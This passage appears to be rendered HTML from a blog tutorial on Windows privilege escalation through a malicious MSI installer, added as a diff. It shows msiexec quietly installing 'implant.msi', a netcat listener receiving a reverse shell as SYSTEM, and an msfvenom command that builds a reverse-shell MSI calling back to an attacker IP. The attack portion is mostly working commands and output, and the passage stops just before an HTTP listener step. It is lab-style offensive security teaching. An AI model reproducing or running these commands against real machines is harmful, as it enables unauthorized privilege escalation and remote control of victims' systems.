+            data-sizes="auto"
+            alt="/images/posts/msi-wrapper-12.png" />
+    </a><figcaption class="image-caption">MSI Wrapper</figcaption>
+    </figure>
+<p>Click next until the build:</p>
+<figure><a class="lightgallery" href="/images/posts/msi-wrapper-13.png" title="/images/posts/msi-wrapper-13.png" data-thumbnail="/images/posts/msi-wrapper-13.png" data-sub-html="<h2>MSI Wrapper</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/posts/msi-wrapper-13.png"
+            data-srcset="/images/posts/msi-wrapper-13.png, /images/posts/msi-wrapper-13.png 1.5x, /images/posts/msi-wrapper-13.png 2x"
+            data-sizes="auto"
+            alt="/images/posts/msi-wrapper-13.png" />
+    </a><figcaption class="image-caption">MSI Wrapper</figcaption>
+    </figure>
+<p>After building the MSI package we will receive a message like this:</p>
+<figure><a class="lightgallery" href="/images/posts/msi-wrapper-14.png" title="/images/posts/msi-wrapper-14.png" data-thumbnail="/images/posts/msi-wrapper-14.png" data-sub-html="<h2>MSI Wrapper</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/posts/msi-wrapper-14.png"
+            data-srcset="/images/posts/msi-wrapper-14.png, /images/posts/msi-wrapper-14.png 1.5x, /images/posts/msi-wrapper-14.png 2x"
+            data-sizes="auto"
+            alt="/images/posts/msi-wrapper-14.png" />
+    </a><figcaption class="image-caption">MSI Wrapper</figcaption>
+    </figure>
+<p>Now click <code>Exit</code> and navigate to the MSI package:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span> <span class="n">whoami</span> <span class="p">/</span><span class="n">all</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">USER</span> <span class="n">INFORMATION</span>
+</span></span><span class="line"><span class="cl"><span class="p">----------------</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">User</span> <span class="n">Name</span>            <span class="n">SID</span>
+</span></span><span class="line"><span class="cl"><span class="p">====================</span> <span class="p">=============================================</span>
+</span></span><span class="line"><span class="cl"><span class="nb">desktop-bn</span><span class="p">\</span><span class="n">user</span> <span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">21</span><span class="p">-</span><span class="mf">264094270</span><span class="p">-</span><span class="mf">2388996790</span><span class="p">-</span><span class="mf">3434637240</span><span class="p">-</span><span class="mf">1001</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">GROUP </span><span class="n">INFORMATION</span>
+</span></span><span class="line"><span class="cl"><span class="p">-----------------</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">Group </span><span class="n">Name</span>                                                    <span class="nb">Type </span>            <span class="n">SID</span>          <span class="n">Attributes</span>
+</span></span><span class="line"><span class="cl"><span class="p">=============================================================</span> <span class="p">================</span> <span class="p">============</span> <span class="p">==================================================</span>
+</span></span><span class="line"><span class="cl"><span class="n">Everyone</span>                                                      <span class="nb">Well-known</span> <span class="nb">group </span><span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">0</span>      <span class="na">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">Local</span> <span class="n">account</span> <span class="n">and</span> <span class="n">member</span> <span class="n">of</span> <span class="n">Administrators</span> <span class="nb">group Well-known</span> <span class="nb">group </span><span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">114</span>    <span class="nb">Group </span><span class="n">used</span> <span class="k">for</span> <span class="n">deny</span> <span class="n">only</span>
+</span></span><span class="line"><span class="cl"><span class="n">BUILTIN</span><span class="p">\</span><span class="n">Administrators</span>                                        <span class="nb">Alias</span>            <span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">32</span><span class="p">-</span><span class="mf">544</span> <span class="nb">Group </span><span class="n">used</span> <span class="k">for</span> <span class="n">deny</span> <span class="n">only</span>
+</span></span><span class="line"><span class="cl"><span class="n">BUILTIN</span><span class="p">\</span><span class="n">Performance</span> <span class="n">Log</span> <span class="n">Users</span>                                 <span class="nb">Alias</span>            <span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">32</span><span class="p">-</span><span class="mf">559</span> <span class="na">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="n">BUILTIN</span><span class="p">\</span><span class="n">Users</span>                                                 <span class="nb">Alias</span>            <span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">32</span><span class="p">-</span><span class="mf">545</span> <span class="na">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">INTERACTIVE</span>                                      <span class="nb">Well-known</span> <span class="nb">group </span><span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">4</span>      <span class="na">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="n">CONSOLE</span> <span class="n">LOGON</span>                                                 <span class="nb">Well-known</span> <span class="nb">group </span><span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">2</span><span class="p">-</span><span class="mf">1</span>      <span class="na">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">Authenticated</span> <span class="n">Users</span>                              <span class="nb">Well-known</span> <span class="nb">group </span><span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">11</span>     <span class="na">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">This</span> <span class="n">Organization</span>                                <span class="nb">Well-known</span> <span class="nb">group </span><span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">15</span>     <span class="na">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">Local</span> <span class="n">account</span>                                    <span class="nb">Well-known</span> <span class="nb">group </span><span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">113</span>    <span class="na">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="n">LOCAL</span>                                                         <span class="nb">Well-known</span> <span class="nb">group </span><span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">2</span><span class="p">-</span><span class="mf">0</span>      <span class="na">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">NTLM</span> <span class="n">Authentication</span>                              <span class="nb">Well-known</span> <span class="nb">group </span><span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">64</span><span class="p">-</span><span class="mf">10</span>  <span class="na">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="na">Mandatory</span> <span class="n">Label</span><span class="p">\</span><span class="n">Medium</span> <span class="na">Mandatory</span> <span class="n">Level</span>                        <span class="n">Label</span>            <span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">16</span><span class="p">-</span><span class="mf">8192</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">PRIVILEGES</span> <span class="n">INFORMATION</span>
+</span></span><span class="line"><span class="cl"><span class="p">----------------------</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Privilege</span> <span class="n">Name</span>                <span class="n">Description</span>                          <span class="n">State</span>
+</span></span><span class="line"><span class="cl"><span class="p">=============================</span> <span class="p">====================================</span> <span class="p">========</span>
+</span></span><span class="line"><span class="cl"><span class="n">SeShutdownPrivilege</span>           <span class="n">Shut</span> <span class="n">down</span> <span class="n">the</span> <span class="n">system</span>                 <span class="n">Disabled</span>
+</span></span><span class="line"><span class="cl"><span class="n">SeChangeNotifyPrivilege</span>       <span class="n">Bypass</span> <span class="n">traverse</span> <span class="n">checking</span>             <span class="n">Enabled</span>
+</span></span><span class="line"><span class="cl"><span class="n">SeUndockPrivilege</span>             <span class="n">Remove</span> <span class="n">computer</span> <span class="n">from</span> <span class="n">docking</span> <span class="n">station</span> <span class="n">Disabled</span>
+</span></span><span class="line"><span class="cl"><span class="n">SeIncreaseWorkingSetPrivilege</span> <span class="n">Increase</span> <span class="n">a</span> <span class="k">process</span> <span class="n">working</span> <span class="nb">set </span>      <span class="n">Disabled</span>
+</span></span><span class="line"><span class="cl"><span class="n">SeTimeZonePrivilege</span>           <span class="n">Change</span> <span class="n">the</span> <span class="n">time</span> <span class="n">zone</span>                 <span class="n">Disabled</span>        <span class="n">Change</span> <span class="n">the</span> <span class="n">time</span> <span class="n">zone</span>                 <span class="n">Disabled</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Install the MSI package quietly:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">msiexec</span> <span class="p">/</span><span class="n">quiet</span> <span class="p">/</span><span class="n">qn</span> <span class="p">/</span><span class="n">i</span> <span class="n">c:</span><span class="p">\</span><span class="n">Tools</span><span class="p">\</span><span class="n">implant</span><span class="p">.</span><span class="py">msi</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>After executing the malicious MSI, we receive a reverse shell as <code>NT AUTHORITY SYSTEM</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="err">❯</span> <span class="n">nc</span> <span class="n">-lvnp</span> <span class="mf">443</span>
+</span></span><span class="line"><span class="cl"><span class="n">listening</span> <span class="n">on</span> <span class="p">[</span><span class="no">any</span><span class="p">]</span> <span class="mf">443</span> <span class="p">...</span>
+</span></span><span class="line"><span class="cl"><span class="n">connect</span> <span class="n">to</span> <span class="p">[</span><span class="mf">192.168</span><span class="p">.</span><span class="py">119</span><span class="p">.</span><span class="mf">130</span><span class="p">]</span> <span class="n">from</span> <span class="p">(</span><span class="n">UNKNOWN</span><span class="p">)</span> <span class="p">[</span><span class="mf">192.168</span><span class="p">.</span><span class="py">119</span><span class="p">.</span><span class="mf">129</span><span class="p">]</span> <span class="mf">58480</span>
+</span></span><span class="line"><span class="cl"><span class="n">Microsoft</span> <span class="n">Windows</span> <span class="p">[</span><span class="no">Version 10.0.22000.318</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="n">Microsoft</span> <span class="n">Corporation</span><span class="p">.</span> <span class="n">All</span> <span class="n">rights</span> <span class="n">reserved</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">SysWOW64</span><span class="p">&gt;</span><span class="n">whoami</span> <span class="p">/</span><span class="n">all</span>
+</span></span><span class="line"><span class="cl"><span class="n">whoami</span> <span class="p">/</span><span class="n">all</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">USER</span> <span class="n">INFORMATION</span>
+</span></span><span class="line"><span class="cl"><span class="p">----------------</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">User</span> <span class="n">Name</span>           <span class="n">SID</span>
+</span></span><span class="line"><span class="cl"><span class="p">===================</span> <span class="p">========</span>
+</span></span><span class="line"><span class="cl"><span class="n">nt</span> <span class="n">authority</span><span class="p">\</span><span class="n">system</span> <span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">18</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">GROUP </span><span class="n">INFORMATION</span>
+</span></span><span class="line"><span class="cl"><span class="p">-----------------</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">Group </span><span class="n">Name</span>                           <span class="nb">Type </span>            <span class="n">SID</span>                                                            <span class="n">Attributes</span>       
+</span></span><span class="line"><span class="cl"><span class="p">====================================</span> <span class="p">================</span> <span class="p">==============================================================</span> <span class="p">==================================================</span>
+</span></span><span class="line"><span class="cl"><span class="na">Mandatory</span> <span class="n">Label</span><span class="p">\</span><span class="n">High</span> <span class="na">Mandatory</span> <span class="n">Level</span> <span class="n">Label</span>            <span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">16</span><span class="p">-</span><span class="mf">12288</span>                                                                    
+</span></span><span class="line"><span class="cl"><span class="n">Everyone</span>                             <span class="nb">Well-known</span> <span class="nb">group </span><span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">0</span>                                                        <span class="na">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="n">BUILTIN</span><span class="p">\</span><span class="n">Users</span>                        <span class="nb">Alias</span>            <span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">32</span><span class="p">-</span><span class="mf">545</span>                                                   <span class="na">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">SERVICE</span>                 <span class="nb">Well-known</span> <span class="nb">group </span><span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">6</span>                                                        <span class="na">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="n">CONSOLE</span> <span class="n">LOGON</span>                        <span class="nb">Well-known</span> <span class="nb">group </span><span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">2</span><span class="p">-</span><span class="mf">1</span>                                                        <span class="na">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">Authenticated</span> <span class="n">Users</span>     <span class="nb">Well-known</span> <span class="nb">group </span><span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">11</span>                                                       <span class="na">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">This</span> <span class="n">Organization</span>       <span class="nb">Well-known</span> <span class="nb">group </span><span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">15</span>                                                       <span class="na">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="n">NT</span> <span class="n">SERVICE</span><span class="p">\</span><span class="n">msiserver</span>                 <span class="nb">Well-known</span> <span class="nb">group </span><span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">80</span><span class="p">-</span><span class="mf">685333868</span><span class="p">-</span><span class="mf">2237257676</span><span class="p">-</span><span class="mf">1431965530</span><span class="p">-</span><span class="mf">1907094206</span><span class="p">-</span><span class="mf">2438021966</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">group</span><span class="p">,</span> <span class="nb">Group </span><span class="n">owner</span>
+</span></span><span class="line"><span class="cl"><span class="n">LOCAL</span>                                <span class="nb">Well-known</span> <span class="nb">group </span><span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">2</span><span class="p">-</span><span class="mf">0</span>                                                        <span class="na">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="n">BUILTIN</span><span class="p">\</span><span class="n">Administrators</span>               <span class="nb">Alias</span>            <span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">32</span><span class="p">-</span><span class="mf">544</span>                                                   <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">group</span><span class="p">,</span> <span class="nb">Group </span><span class="n">owner</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">PRIVILEGES</span> <span class="n">INFORMATION</span>
+</span></span><span class="line"><span class="cl"><span class="p">----------------------</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Privilege</span> <span class="n">Name</span>                  <span class="n">Description</span>                               <span class="n">State</span>
+</span></span><span class="line"><span class="cl"><span class="p">===============================</span> <span class="p">=========================================</span> <span class="p">========</span>
+</span></span><span class="line"><span class="cl"><span class="n">SeAssignPrimaryTokenPrivilege</span>   <span class="n">Replace</span> <span class="n">a</span> <span class="k">process</span> <span class="n">level</span> <span class="n">token</span>             <span class="n">Disabled</span>
+</span></span><span class="line"><span class="cl"><span class="n">SeLockMemoryPrivilege</span>           <span class="n">Lock</span> <span class="n">pages</span> <span class="k">in</span> <span class="n">memory</span>                      <span class="n">Enabled</span>
+</span></span><span class="line"><span class="cl"><span class="n">SeIncreaseQuotaPrivilege</span>        <span class="n">Adjust</span> <span class="n">memory</span> <span class="n">quotas</span> <span class="k">for</span> <span class="n">a</span> <span class="k">process</span>        <span class="n">Disabled</span>
+</span></span><span class="line"><span class="cl"><span class="n">SeTcbPrivilege</span>                  <span class="n">Act</span> <span class="n">as</span> <span class="n">part</span> <span class="n">of</span> <span class="n">the</span> <span class="n">operating</span> <span class="n">system</span>       <span class="n">Enabled</span>
+</span></span><span class="line"><span class="cl"><span class="n">SeSecurityPrivilege</span>             <span class="n">Manage</span> <span class="n">auditing</span> <span class="n">and</span> <span class="n">security</span> <span class="n">log</span>          <span class="n">Enabled</span>
+</span></span><span class="line"><span class="cl"><span class="n">SeTakeOwnershipPrivilege</span>        <span class="n">Take</span> <span class="n">ownership</span> <span class="n">of</span> <span class="n">files</span> <span class="n">or</span> <span class="n">other</span> <span class="n">objects</span>  <span class="n">Disabled</span>
+</span></span><span class="line"><span class="cl"><span class="n">SeLoadDriverPrivilege</span>           <span class="n">Load</span> <span class="n">and</span> <span class="n">unload</span> <span class="n">device</span> <span class="n">drivers</span>            <span class="n">Disabled</span>
+</span></span><span class="line"><span class="cl"><span class="n">SeProfileSingleProcessPrivilege</span> <span class="n">Profile</span> <span class="n">single</span> <span class="k">process</span>                    <span class="n">Enabled</span>
+</span></span><span class="line"><span class="cl"><span class="n">SeIncreaseBasePriorityPrivilege</span> <span class="n">Increase</span> <span class="n">scheduling</span> <span class="n">priority</span>              <span class="n">Enabled</span>
+</span></span><span class="line"><span class="cl"><span class="n">SeCreatePagefilePrivilege</span>       <span class="n">Create</span> <span class="n">a</span> <span class="n">pagefile</span>                         <span class="n">Enabled</span>
+</span></span><span class="line"><span class="cl"><span class="n">SeCreatePermanentPrivilege</span>      <span class="n">Create</span> <span class="n">permanent</span> <span class="n">shared</span> <span class="n">objects</span>           <span class="n">Enabled</span>
+</span></span><span class="line"><span class="cl"><span class="n">SeBackupPrivilege</span>               <span class="n">Back</span> <span class="n">up</span> <span class="n">files</span> <span class="n">and</span> <span class="n">directories</span>             <span class="n">Disabled</span>
+</span></span><span class="line"><span class="cl"><span class="n">SeRestorePrivilege</span>              <span class="n">Restore</span> <span class="n">files</span> <span class="n">and</span> <span class="n">directories</span>             <span class="n">Disabled</span>
+</span></span><span class="line"><span class="cl"><span class="n">SeShutdownPrivilege</span>             <span class="n">Shut</span> <span class="n">down</span> <span class="n">the</span> <span class="n">system</span>                      <span class="n">Disabled</span>
+</span></span><span class="line"><span class="cl"><span class="n">SeAuditPrivilege</span>                <span class="n">Generate</span> <span class="n">security</span> <span class="n">audits</span>                  <span class="n">Enabled</span>
+</span></span><span class="line"><span class="cl"><span class="n">SeChangeNotifyPrivilege</span>         <span class="n">Bypass</span> <span class="n">traverse</span> <span class="n">checking</span>                  <span class="n">Enabled</span>
+</span></span><span class="line"><span class="cl"><span class="n">SeImpersonatePrivilege</span>          <span class="n">Impersonate</span> <span class="n">a</span> <span class="n">client</span> <span class="n">after</span> <span class="n">authentication</span> <span class="n">Enabled</span>
+</span></span><span class="line"><span class="cl"><span class="n">SeCreateGlobalPrivilege</span>         <span class="n">Create</span> <span class="n">global</span> <span class="n">objects</span>                     <span class="n">Enabled</span>
+</span></span><span class="line"><span class="cl"><span class="n">SeCreateSymbolicLinkPrivilege</span>   <span class="n">Create</span> <span class="n">symbolic</span> <span class="n">links</span>                     <span class="n">Enabled</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ERROR</span><span class="err">:</span> <span class="n">Unable</span> <span class="n">to</span> <span class="n">get</span> <span class="n">user</span> <span class="n">claims</span> <span class="n">information</span><span class="p">.</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>If we execute Process Hacker as Administrator we can see the process tree:</p>
+<figure><a class="lightgallery" href="/images/posts/process-hacker-autoelevate.png" title="/images/posts/process-hacker-autoelevate.png" data-thumbnail="/images/posts/process-hacker-autoelevate.png" data-sub-html="<h2>Process Hacker AutoElevate</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/posts/process-hacker-autoelevate.png"
+            data-srcset="/images/posts/process-hacker-autoelevate.png, /images/posts/process-hacker-autoelevate.png 1.5x, /images/posts/process-hacker-autoelevate.png 2x"
+            data-sizes="auto"
+            alt="/images/posts/process-hacker-autoelevate.png" />
+    </a><figcaption class="image-caption">Process Hacker AutoElevate</figcaption>
+    </figure>
+<blockquote>
+<p>Note: In the case that you don&rsquo;t see the process tree, double click on the Name column to change the view. You may need to double click (change the view) multiple times.</p>
+</blockquote>
+<p>Alternatively, we can just generate an MSI reverse shell:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">msfvenom -p windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>192.168.119.130 <span class="nv">LPORT</span><span class="o">=</span><span class="m">443</span> -f msi -o implant.msi
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>Note: This can be easily detected by modern AVs.</p>
+</blockquote>
+<p>Setup an HTTP listener with python:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
